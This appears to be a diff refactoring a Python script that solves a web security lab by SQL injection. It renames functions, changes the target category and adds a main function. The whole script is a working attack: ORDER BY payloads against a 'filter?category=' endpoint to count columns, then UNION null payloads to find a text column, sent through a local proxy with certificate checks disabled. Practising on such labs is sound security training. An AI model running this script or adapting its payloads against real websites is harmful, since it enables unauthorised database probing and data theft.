@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import requests
 import sys
 import urllib3
@@ -5,8 +7,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def exploit_sqli_column_number(url):
-    path = "filter?category=Gifts"
+def column_number(url):
+    path = "filter?category=Lifestyle"
     for i in range(1,50):
         sql_payload = "'+order+by+%s--" %i
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
@@ -16,8 +18,8 @@ def exploit_sqli_column_number(url):
         i = i + 1
     return False
 
-def exploit_sqli_string_field(url, num_col):
-    path = "filter?category=Gifts"
+def str_field(url, num_col):
+    path = "filter?category=Lifestyle"
     for i in range(1, num_col+1):
         string = "'v2F6UA'"
         payload_list = ['null'] * num_col
@@ -29,20 +31,21 @@ def exploit_sqli_string_field(url, num_col):
             return i
     return False
 
-if __name__ == "__main__":
+def main():
     try:
         url = sys.argv[1].strip()
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
+    else:
+        print("[+] Figuring out number of columns...")
 
-    print("[+] Figuring out number of columns...")
-    num_col = exploit_sqli_column_number(url)
+    num_col = column_number(url)
     if num_col:
         print("[+] The number of columns is " + str(num_col) + "." )
         print("[+] Figuring out which column contains text...")
-        string_column = exploit_sqli_string_field(url, num_col)
+        string_column = str_field(url, num_col)
         if string_column:
             print("[+] The column that contains text is " + str(string_column) + ".")
         else:
@@ -50,4 +53,8 @@ if __name__ == "__main__":
     else:
         print("[-] The SQLi attack was not successful.")
 
+
+
+if __name__ == "__main__":
+    main()
 
